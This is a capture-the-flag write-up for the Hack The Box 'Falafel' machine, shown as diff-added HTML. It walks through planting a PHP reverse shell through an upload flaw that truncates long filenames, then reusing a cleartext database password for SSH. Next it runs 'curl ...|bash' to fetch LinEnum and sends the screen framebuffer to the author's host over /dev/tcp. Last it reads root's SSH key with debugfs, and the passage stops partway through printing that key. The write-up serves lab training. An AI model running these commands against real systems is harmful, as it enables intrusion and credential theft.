+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$</span> touch Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4.png
+<span class="go">touch: cannot touch &#39;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4.png&#39;: File name too long</span>
+</pre></div>
+
+
+<p>as expected we receive a message that the file name is too long because by adding <code>.png</code> I added 4 additional characters to the allowed limit. So let's remove the 4 characters before <code>.png</code>, then we have:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$</span> touch Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai.png
+<span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$</span> ll
+<span class="go">total 308</span>
+<span class="go">-rw-r--r-- 1 m4rc0ff m4rc0ff     0 May 29 06:18 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai.png</span>
+</pre></div>
+
+
+<p>The file was created with no errors! When I try to upload this new long file I get the following response:</p>
+<div class="highlight"><pre><span></span><span class="go">Upload Succsesful!</span>
+<span class="go">Output:</span>
+
+<span class="go">CMD: cd /var/www/html/uploads/0529-0825_d97a30e4fc1bfb9d; wget &#39;http://10.10.14.15/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai.png&#39;</span>
+
+<span class="go">The name is too long, 255 chars total.</span>
+<span class="go">Trying to shorten...</span>
+<span class="go">New name is Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah.</span>
+<span class="go">--2020-05-29 08:25:43--  http://10.10.14.15/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai.png</span>
+<span class="go">Connecting to 10.10.14.15:80... connected.</span>
+<span class="go">HTTP request sent, awaiting response... 200 OK</span>
+<span class="go">Length: 0 [image/png]</span>
+<span class="go">Saving to: &#39;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah&#39;</span>
+
+<span class="go">     0K                                                        0.00 =0s</span>
+
+<span class="go">2020-05-29 08:25:43 (0.00 B/s) - &#39;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah&#39; saved [0/0]</span>
+</pre></div>
+
+
+<p>We can see that the webserver complains that the file is too long and trunctates it to this:</p>
+<div class="highlight"><pre><span></span><span class="go">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah</span>
+</pre></div>
+
+
+<p>if we couont the characters we see this:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$</span> <span class="nb">echo</span> -n <span class="s2">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah&quot;</span> <span class="p">|</span> wc -c
+<span class="go">236</span>
+</pre></div>
+
+
+<p>So we have 236 chars. I will now create a 240 characters file as follow:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$</span> touch Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php.png
+</pre></div>
+
+
+<p>From the previous file I have basically removed the last 4 characters and added <code>.php</code> and <code>.png</code>.</p>
+<p>We know we need a <code>.png</code> (or any image) extension for the file to pass the upload filter. Once the file is uploaded the last 4 characters will be cut off hence remaining with the 236 characters file with <code>.php</code> extension. Of course we have to include our PHP shell inside the file before to do this operation:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$</span> cp /usr/share/webshells/php/php-reverse-shell.php Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php.png
+</pre></div>
+
+
+<p>I changed the following parameters in the shell and added my box IP and 443 as a port:</p>
+<div class="highlight"><pre><span></span><span class="x">$VERSION = &quot;1.0&quot;;</span>
+<span class="x">$ip = &#39;10.10.14.15&#39;;  // CHANGE THIS</span>
+<span class="x">$port = 443;       // CHANGE THIS</span>
+</pre></div>
+
+
+<p>Now I set a netact listenr on port 443 on my kali machine and then I upload the file:</p>
+<div class="highlight"><pre><span></span><span class="go">Upload via url:</span>
+<span class="go">Upload Succsesful!</span>
+<span class="go">Output:</span>
+
+<span class="go">CMD: cd /var/www/html/uploads/0529-0853_c2b0d421d9175469; wget &#39;http://10.10.14.15/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php.png&#39;</span>
+
+<span class="go">The name is too long, 240 chars total.</span>
+<span class="go">Trying to shorten...</span>
+<span class="go">New name is Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php.</span>
+<span class="go">--2020-05-29 08:53:40--  http://10.10.14.15/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php.png</span>
+<span class="go">Connecting to 10.10.14.15:80... connected.</span>
+<span class="go">HTTP request sent, awaiting response... 200 OK</span>
+<span class="go">Length: 5492 (5.4K) [image/png]</span>
+<span class="go">Saving to: &#39;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php&#39;</span>
+
+<span class="go">     0K .....                                                 100% 7.83M=0.001s</span>
+
+<span class="go">2020-05-29 08:53:40 (7.83 MB/s) - &#39;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php&#39; saved [5492/5492]</span>
+</pre></div>
+
+
+<p>Now as expected we see that the file is truncated again and the webserver saves the file with <code>.php</code> extension containing our shell. To trigger the shell we need to visit the location where the shell was saved which is <code>/var/www/html/uploads/0529-0853_c2b0d421d9175469</code> as we see at the beginning of the output.</p>
+<p>So once I visit this address from my browser:</p>
+<p><code>http://10.10.10.73/uploads/0529-0853_c2b0d421d9175469/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php</code></p>
+<p>I get the shell back:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo nc -lnvp <span class="m">443</span>
+<span class="go">[sudo] password for m4rc0ff: </span>
+<span class="go">listening on [any] 443 ...</span>
+<span class="go">connect to [10.10.14.15] from (UNKNOWN) [10.10.10.73] 56932</span>
+<span class="go">Linux falafel 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>
+<span class="go"> 08:58:41 up 23:03,  1 user,  load average: 0.00, 0.00, 0.00</span>
+<span class="go">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span>
+<span class="go">yossi    tty1                      Thu09   23:03m  0.04s  0.04s -bash</span>
+<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+<span class="go">/bin/sh: 0: can&#39;t access tty; job control turned off</span>
+<span class="gp">$</span> whoami
+<span class="go">www-data</span>
+</pre></div>
+
+
+<p>The can see that we are in as the <code>www-data</code> user. To upgrade to a full interactive shell I used a cheatsheet I created sometime ago available <a href="https://sittingducks.io/From%20basic%20shell%20to%20fully%20interactive.html">here</a> with the only difference that I had to use <code>python3</code> instead of <code>python</code> in the initial command because <code>python</code> was not installed.</p>
+<p>Having a look at the home directory:</p>
+<div class="highlight"><pre><span></span><span class="gp">www-data@falafel:/home$</span> ls
+<span class="go">moshe  yossi</span>
+<span class="gp">www-data@falafel:/home$</span> <span class="nb">cd</span> moshe
+<span class="go">bash: cd: moshe: Permission denied</span>
+<span class="gp">www-data@falafel:/home$</span> <span class="nb">cd</span> yossi/
+<span class="go">bash: cd: yossi/: Permission denied</span>
+</pre></div>
+
+
+<p>we can see there are two users but both locations are not accessible. </p>
+<p>Since we got the shell as the <code>www-data</code> user, that is the default apache user, we surely have permission to access the webserver direrctories so let's have a look:</p>
+<div class="highlight"><pre><span></span><span class="gp">www-data@falafel:/var/www/html$</span> ls -l
+<span class="go">total 80</span>
+<span class="go">drwxr-xr--  2 root www-data 4096 Oct 29  2017 assets</span>
+<span class="go">-rwxr-xr--  1 root www-data  423 Oct 29  2017 authorized.php</span>
+<span class="go">-rwxr-xr--  1 root www-data  377 Nov 28  2017 connection.php</span>
+<span class="go">drwxr-xr--  2 root www-data 4096 Nov 28  2017 css</span>
+<span class="go">-rwxr-xr--  1 root www-data  804 Nov 27  2017 cyberlaw.txt</span>
+<span class="go">-rwxr-xr--  1 root www-data    0 Nov 27  2017 footer.php</span>
+<span class="go">-rwxr-xr--  1 root www-data 1140 Nov 27  2017 header.php</span>
+<span class="go">-rwxr-xr--  1 root www-data 7335 Aug 13  2015 icon.png</span>
+<span class="go">drwxr-xr--  2 root www-data 4096 Nov 27  2017 images</span>
+<span class="go">-rwxr-xr--  1 root www-data  818 Nov 28  2017 index.php</span>
+<span class="go">drwxr-xr--  2 root www-data 4096 Nov 28  2017 js</span>
+<span class="go">-rwxr-xr--  1 root www-data  752 Oct 29  2017 login.php</span>
+<span class="go">-rwxr-xr--  1 root www-data 1800 Nov 28  2017 login_logic.php</span>
+<span class="go">-rwxr-xr--  1 root www-data  107 Oct 29  2017 logout.php</span>
+<span class="go">-rwxr-xr--  1 root www-data 1913 Nov 28  2017 profile.php</span>
+<span class="go">-rwxr-xr--  1 root www-data   30 Nov 28  2017 robots.txt</span>
+<span class="go">-rwxr-xr--  1 root www-data 6174 Nov 28  2017 style.php</span>
+<span class="go">-rwxr-xr--  1 root www-data 3647 Nov 28  2017 upload.php</span>
+<span class="go">drwxrwxr-- 14 root www-data 4096 May 29 08:54 uploads</span>
+</pre></div>
+
+
+<p>Browsing amongst the files I spotted this:</p>
+<div class="highlight"><pre><span></span><span class="x">www-data@falafel:/var/www/html$ cat connection.php </span>
+<span class="cp">&lt;?php</span>
+   <span class="nb">define</span><span class="p">(</span><span class="s1">&#39;DB_SERVER&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost:3306&#39;</span><span class="p">);</span>
+   <span class="nb">define</span><span class="p">(</span><span class="s1">&#39;DB_USERNAME&#39;</span><span class="p">,</span> <span class="s1">&#39;moshe&#39;</span><span class="p">);</span>
+   <span class="nb">define</span><span class="p">(</span><span class="s1">&#39;DB_PASSWORD&#39;</span><span class="p">,</span> <span class="s1">&#39;falafelIsReallyTasty&#39;</span><span class="p">);</span>
+   <span class="nb">define</span><span class="p">(</span><span class="s1">&#39;DB_DATABASE&#39;</span><span class="p">,</span> <span class="s1">&#39;falafel&#39;</span><span class="p">);</span>
+   <span class="nv">$db</span> <span class="o">=</span> <span class="nb">mysqli_connect</span><span class="p">(</span><span class="nx">DB_SERVER</span><span class="p">,</span><span class="nx">DB_USERNAME</span><span class="p">,</span><span class="nx">DB_PASSWORD</span><span class="p">,</span><span class="nx">DB_DATABASE</span><span class="p">);</span>
+   <span class="c1">// Check connection</span>
+   <span class="k">if</span> <span class="p">(</span><span class="nx">mysqli_connect_errno</span><span class="p">())</span>
+   <span class="p">{</span>
+      <span class="k">echo</span> <span class="s2">&quot;Failed to connect to MySQL: &quot;</span> <span class="o">.</span> <span class="nx">mysqli_connect_error</span><span class="p">();</span>
+   <span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+
+<p>We can see the credentials to access the MySQL db in clear. </p>
+<p>So since the SSH port is open I try an SSH login with the same credentials:</p>
+<div class="highlight"><pre><span></span><span class="gp">www-data@falafel:/var/www/html$</span> ssh moshe@localhost
+<span class="go">Could not create directory &#39;/var/www/.ssh&#39;.</span>
+<span class="go">The authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.</span>
+<span class="go">ECDSA key fingerprint is SHA256:XPYifpo9zwt53hU1RwUWqFvOB3TlCtyA1PfM9frNWSw.</span>
+<span class="go">Are you sure you want to continue connecting (yes/no)? yes</span>
+<span class="go">Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).</span>
+<span class="go">moshe@localhost&#39;s password: </span>
+<span class="go">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)</span>
+
+<span class="go"> * Documentation:  https://help.ubuntu.com</span>
+<span class="go"> * Management:     https://landscape.canonical.com</span>
+<span class="go"> * Support:        https://ubuntu.com/advantage</span>
+
+<span class="go">0 packages can be updated.</span>
+<span class="go">0 updates are security updates.</span>
+
+
+<span class="go">Last login: Mon Feb  5 23:35:10 2018 from 10.10.14.2</span>
+<span class="gp">$</span><span class="nb">pwd</span>
+<span class="go">/home/moshe</span>
+<span class="gp">$</span> cat user.txt
+<span class="go">c8****************************d3</span>
+</pre></div>
+
+
+<p>and we are in as <code>moshe</code> and able to get the <code>user.txt</code> flag.</p>
+<p>At this stage, after having a look around I decided to run <a href="https://github.com/rebootuser/LinEnum">LinEnum</a> to gather more information, so I started a python SimpleHttp server in my box to host <code>LinEnum.sh</code> and then I ran the below command from the victim box:</p>
+<div class="highlight"><pre><span></span><span class="gp">moshe@falafel:~$</span> curl http://10.10.14.15/LinEnum.sh<span class="p">|</span>bash                                            
+</pre></div>
+
+
+<p>The output is quite extensive so I will report only snippets of the interesting bits.</p>
+<ol>
+<li>
+<p>This bit is interesting because tells us there is a user called <code>yossi</code> who is phisically (<code>tty</code>) logged in to the box</p>
+<p><code>console
+  [-] Who else is logged on:
+  12:07:25 up  2:03,  2 users,  load average: 0.00, 0.00, 0.00
+  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+  yossi    tty1                      10:03    2:03m  0.05s  0.04s -bash
+  moshe    pts/0    10.10.14.15      11:16    5.00s  0.06s  0.06s python3 -c import pty;pty.spawn("/bin/bash")</code></p>
+</li>
+<li>
+<p>This other bit is also interesting becaut it tells us the users group membership:</p>
+<p><code>console
+  uid=1000(yossi) gid=1000(yossi) groups=1000(yossi),4(adm),6(disk),24(cdrom),30(dip),46(plugdev),117(lpadmin),118(sambashare)
+  uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)</code></p>
+</li>
+</ol>
+<p>Let's focus to <code>moshe</code> for now. We see that <code>moshe</code> belogs to the <code>video</code> group. This is unusual and it may be useful, but why?</p>
+<p>From the <a href="https://wiki.ubuntu.com/Security/Privileges#Use_video_devices">Ubuntu wiki</a>, we can see this about the <code>video</code> group:</p>
+<div class="highlight"><pre><span></span>Use video devices
+
+This right is gained by adding the user to the &quot;video&quot; group.
+
+The &quot;video&quot; group can access /dev/fb0.  
+</pre></div>
+
+
+<p>By belonging to that group the user <code>moshe</code> has permissions to "dump" the phisycal monitor, and because <code>youssi</code> is currently logged in to the box through a <code>tty</code> (direct connection, not an SSH session), we may be able to steal some potentially useful information from his screen.</p>
+<p>As per the Ubuntu wiki, the frame buffer is stored in <code>/dev/fb0</code>, so let's grab that frame and copy it over my linux box. Since python SimpleHTTPServer module is not aavailable on Falafel, I found another way to copy the file over (thanks to Ippsec video I mentioned earlier):</p>
+<p>First I setup a netat listener on port 4444 which redirects anything that comes to a file called <code>fb0</code></p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$</span> sudo nc -lnvp <span class="m">4444</span> &gt; fb0.raw
+<span class="go">[sudo] password for m4rc0ff: </span>
+<span class="go">listening on [any] 4444 ...</span>
+</pre></div>
+
+
+<p>then from the victim box, I direct the content of the <code>fb0</code> file to the port 4444 listener:</p>
+<div class="highlight"><pre><span></span><span class="gp">moshe@falafel:~$</span> cat /dev/fb0 &gt; /dev/tcp/10.10.14.15/4444
+</pre></div>
+
+
+<p>Once I do this I get something back and I can see the file is in my box:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$</span> sudo nc -lnvp <span class="m">4444</span> &gt; screenshot.raw
+<span class="go">[sudo] password for m4rc0ff: </span>
+<span class="go">listening on [any] 4444 ...</span>
+<span class="go">connect to [10.10.14.15] from (UNKNOWN) [10.10.10.73] 36364</span>
+<span class="go">^C</span>
+<span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$</span> ll<span class="p">|</span>grep screen
+<span class="go">-rw-r--r-- 1 m4rc0ff m4rc0ff 1526575 May 29 11:57 screenshot.raw</span>
+</pre></div>
+
+
+<p>Looking at what kind of file we are dealing with, we see this:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$</span> file screenshot.raw 
+<span class="go">screenshot.raw: Targa image data - Map (256-257) 257 x 1 x 1 +257 +1 - 1-bit alpha &quot;\001&quot;</span>
+</pre></div>
+
+
+<p>A <a href="https://en.wikipedia.org/wiki/Truevision_TGA"><code>Targa image data</code> (TGA)</a> file is a kind of raw file. To be able to view the file we need to set the correct resolution. This can be fetched from:</p>
+<div class="highlight"><pre><span></span><span class="gp">moshe@falafel:~$</span> cat /sys/class/graphics/fb0/virtual_size
+<span class="go">1176,885</span>
+</pre></div>
+
+
+<p>Then we can use <code>gimp</code> to open the file. It need so be opened as a "RAW image data" file type and also the resolution details found earlier should be inserted for the file to be readable. As you can see from below I also used "RGB565 Big Endian" so make the file readable:</p>
+<p><img alt="" src="../images/falafel-yossi.png"></p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> ssh yossi@10.10.10.73
+<span class="go">yossi@10.10.10.73&#39;s password: </span>
+<span class="go">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)</span>
+
+<span class="go"> * Documentation:  https://help.ubuntu.com</span>
+<span class="go"> * Management:     https://landscape.canonical.com</span>
+<span class="go"> * Support:        https://ubuntu.com/advantage</span>
+
+<span class="go">0 packages can be updated.</span>
+<span class="go">0 updates are security updates.</span>
+
+
+<span class="go">Last login: Fri May 29 10:03:49 2020</span>
+<span class="gp">yossi@falafel:~$</span> id
+<span class="go">uid=1000(yossi) gid=1000(yossi) groups=1000(yossi),4(adm),6(disk),24(cdrom),30(dip),46(plugdev),117(lpadmin),118(sambashare)</span>
+</pre></div>
+
+
+<p>As shown above I was able to login with the password found!</p>
+<p>The <code>id</code> command shows that the user <code>yossi</code> belongs to the group <code>disk</code>. We knew this already from the <code>LinEnum.sh</code> script I ran earlier. </p>
+<p>This means that <code>yossi</code> can read directly off the raw disks. To do that we can use <code>debugfs</code> utility. We can read directly the root flag but I always prefer to get a shell.</p>
+<p>Since we have access to the raw disks and therefore to the <code>/root</code> directory, and also knowing from <code>LinEnum.sh</code> output that the toot user is allowed to login through SSH, we can grab the SSH key and use it to login:</p>
+<div class="highlight"><pre><span></span><span class="gp">yossi@falafel:~$</span> debugfs -R <span class="s2">&quot;cat /root/.ssh/id_ssh/id_rsa&quot;</span> /dev/sda1
+<span class="go">debugfs 1.42.13 (17-May-2015)</span>
+<span class="go">/root/.ssh/id_ssh/id_rsa: File not found by ext2_lookup </span>
+<span class="gp">yossi@falafel:~$</span> debugfs 
+<span class="go">debugfs 1.42.13 (17-May-2015)</span>
+<span class="go">debugfs:  quit</span>
+<span class="gp">yossi@falafel:~$</span> debugfs /dev/sda1
+<span class="go">debugfs 1.42.13 (17-May-2015)</span>
+<span class="go">debugfs:  ls</span>
+<span class="go">debugfs:  cd root</span>
+<span class="go">debugfs:  cd .ssh</span>
+<span class="go">debugfs:  cat id_rsa</span>
+<span class="go">-----BEGIN RSA PRIVATE KEY-----</span>
+<span class="go">MIIEpAIBAAKCAQEAyPdlQuyVr/L4xXiDVK8lTn88k4zVEEfiRVQ1AWxQPOHY7q0h</span>
